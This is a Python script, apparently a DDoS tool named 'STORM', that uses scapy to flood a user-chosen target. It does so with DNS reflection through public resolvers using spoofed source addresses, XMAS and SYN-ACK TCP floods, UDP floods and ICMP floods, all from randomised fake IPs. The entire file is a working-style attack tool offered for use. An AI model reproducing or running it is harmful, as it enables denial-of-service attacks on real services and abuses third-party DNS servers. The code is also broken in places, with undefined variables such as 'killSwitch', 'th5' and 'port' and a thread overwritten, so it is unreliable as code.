from scapy.all import *
from colorama import Fore
import time, threading, sys, random, string

_abort = False

def _dns(_ip):
    _svrs = [
        '8.8.8.8',
        '8.8.4.4',
        '1.1.1.1',
        '1.0.0.1',
        '9.9.9.9',
        '4.2.2.1',
        '4.2.2.2',
        '4.2.2.3',
        '4.2.2.4',
        '4.2.2.5',
        '4.2.2.6',
        '8.26.56.26',
        '8.20.247.20',
        '77.88.8.8',
        '77.88.8.1'
    ]
    while killSwitch == False:
        try:
            _Server = random.choice(_svrs)
            packet = IP(dst=_Server, src=_ip) / UDP(sport=RandShort(), dport=53) / DNS(rd=1,opcode=0,qd=DNSQR(qname="www.example.com",qclass="IN",qtype="A"))
            send(packet, verbose=False)
        except:
            pass
            
            
def _xmas(_ip, _prt):
    while killSwitch == False:
        try:
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = ".".join(map(str, (randint(0,255)for _ in range(4))))
            IP_Packet.dst = sys.argv[1]

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(sys.argv[2])
            TCP_Packet.flags = "FSRPAUEC"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)
        except:
            pass

def _ssyn(_ip, _prt):
    while killSwitch == False:
        try:
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = ".".join(map(str, (randint(0,255)for _ in range(4))))
            IP_Packet.dst = sys.argv[1]

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(sys.argv[2])
            TCP_Packet.flags = "SA"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)
        except:
            pass

def _sudp(_ip, _prt):
    while killSwitch == False:
        try:
            # generate fake ip
            fakeSrc = ".".join(map(str, (randint(0,255)for _ in range(4))))
            
            # select random src port
            src_port = int(RandShort())
            
            # generate data buffer
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(1500, 4096)))
            
            # craft and send packet
            packet = IP(src=fakeSrc, dst=sys.argv[1]) / UDP(sport=src_port, dport=port) / payload
            send(packet, verbose=False)
        except:
            pass

def _icmp(_ip, _iface):
    while killSwitch == False:
        try:
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(1500, 4096)))
            fake = ".".join(str(random.randint(0, 255)) for _ in range(4))
            socket = conf.L2socket(iface=_iface)
            pkt = IP(src=fake, dst=_ip) / ICMP(type=8,code=0) / payload.encode()
            send(pkt, verbose=0)
        except:
            pass
            
def _rslv(_host):
    from urllib.parse import urlparse
    try:
        xhost = _host.lower()
        if not (xhost.startswith("http://") or xhost.startswith("https://")):
            xhost = "http://" + xhost
         
        _domain = urlparse(xhost).netloc
        _eip = socket.gethostbyname(_domain)
        return _eip
    except:
        sys.exit()

def main():
    global _abort
    try:
        arg1 = input('\r\n\033[1m \033[34mIP/URL: \033[31m')
        arg1 = _rslv(arg1)
        arg2 = input(' \033[34mPORT: \033[31m')
        arg3 = input(' \033[34mINTERFACE: \033[31m')
        _thdz = input(' \033[34mTHREAD/S: \033[31m')
        _time = input(' \033[34mSECONDS: \033[31m')
    except KeyboardInterrupt:
        sys.exit()
    
    z = input('\r\n\033[37m Ready? Strike <ENTER> to attack and <CTRL+C> to quit...')
    
    print('\r\n\r\n ---> STORM multi-vector flood sent to ' + arg1 + ' for ' + _time + ' seconds!')

    th1 = threading.Thread(target=_dns, args=(arg1))
    th2 = threading.Thread(target=_xmas, args=(arg1, arg2))
    th3 = threading.Thread(target=_ssyn, args=(arg1, arg2))
    th4 = threading.Thread(target=_sudp, args=(arg1, arg2))
    th3 = threading.Thread(target=_icmp, args=(arg1, arg3))
    th1.start()
    th2.start()
    th3.start()
    th4.start()
    th5.start()
        
    _quit = time.time() + int(_time)
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
        
    _abort = True
    
    th1.join()
    th2.join()
    th3.join()
    th4.join()
    th5.join()
        
    sys.exit()
    
if __name__ == "__main__":
    main()
